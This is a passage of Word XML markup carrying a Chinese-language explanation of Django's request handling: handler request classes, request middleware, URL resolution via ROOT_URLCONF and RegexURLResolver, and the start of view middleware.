      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>接下来它实例化一个django.http.HttpRequest 的子类</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。根据不同的处理器，可能是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.handlers.modpython.ModPythonRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的一个实例，也可能是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.handlers.wsgi.WSGIRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的一个实例。需要两个不同的类是因</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为</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> mod_python </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 xml:space="preserve"> WSGI APIs </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>以不同的格式传入</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信息，这个信息需要</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解析为</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能够处理的一个单独的标准格式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D6725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lastRenderedPageBreak/>
        <w:t>一旦一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>或者类似的东西存在了，处理器就调用它自己的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> get_response </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>方法，传入这个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>作为唯一的参数。这里就是几乎所</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有真正的活动发生的地方。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEDF73C"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2" w:name="sec9"/>
      <w:bookmarkEnd w:id="62"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Middleware</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，第一回合</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56327B08"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get_response 做的第一件事就是遍历处理器的 _request_middleware 实例变量 并调用其中的每一个方法，传入 HttpRequest 的实例作为参数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A6D19F"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for middleware_method in </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>._request_middleware:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC4BA4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response = middleware_method(request)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792BC0E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if response:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E94998A"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break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D3166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这些方法可以选</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择短路剩下的处理并立即让</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> get_response </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>返回，通过返回自身的一个值（如果</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它们这样做，返回值必须是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.http.HttpResponse </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的一个实例，后面会讨</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论到）。如果其中之一这样做了，我们会立即回到主处理器代码，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">get_response </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>不会等着看其它</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类想要做什么，它直接返回，然后处理器进入</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阶段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0E5982"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然而，更一般的情况是，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>这里应用的 middleware 方法简单地做一些处理并决定 是否增加，删除或补充 request 的属性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178CBB01"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3" w:name="sec10"/>
      <w:bookmarkEnd w:id="63"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>关于解析</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CEEC2A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假设没有一个作用于</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直接返回</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> response</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，处理器下一</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步会尝试解析请求的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。它在配置文件中寻找一个叫做</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> ROOT_URLCONF </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的配</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置，用这个配置加上根</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，作为参数来创建</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.urlresolvers.RegexURLResolver </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的一个实例，然后调用它的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> resolve </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>方法来解析请求的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路径。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EAD1C8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URL resolver </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>遵循一个相当简单的模式。对于在</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配置文件中根据</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> ROOT_URLCONF </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的配置产生的每一个在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> urlpatterns </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>列表中的条目，它会检查请</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求的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路径是否与这个条目的正则表达式相匹配，如果是的话，有两种选择：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122BA3C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如果这个条目有一个可以调用的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> include</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resolver </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>截取匹配的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，转</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到</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> include </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>指定的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配置文件并开始遍历其中</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> urlpatterns </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>列表中的</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每一个条目。根据你</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的深度和模块性，这可能重复好几次。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F361EF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否则，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">resolver </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>返回三个条目：匹配的条目指定的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> view function</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>；一个</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从</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得到的未命名匹配组（被用来作为</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> view </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的位置参数）；一个关键</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字参数字典，它由从</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得到的任意命名匹配组和从</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> URLConf </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>中得到的任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意其它关键字参数组合而成。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4EF39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注意这一过程会在匹配到第一个指定了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> view </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的条目时停止，因此最好让你的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配置从复杂的正则过渡到简单的正则，这样能确保</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> resolver </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>不会首先匹配</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到简单的那一个而返回错误的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> view function</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E416D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如果没有找到匹配的条目，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">resolver </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>会产生</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.urlresolvers.Resolver404 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>异常，它是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.http.Http404 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>例</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外的子类。后面我们会知道它是如何处理的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364C086C"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4" w:name="sec11"/>
      <w:bookmarkEnd w:id="64"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Middleware</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，第二回合</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DEBEF6D"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一旦知道了所需的 view function 和相关的参数，处理器就会查看它的 _view_middleware 列表，并调用其中的方法</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
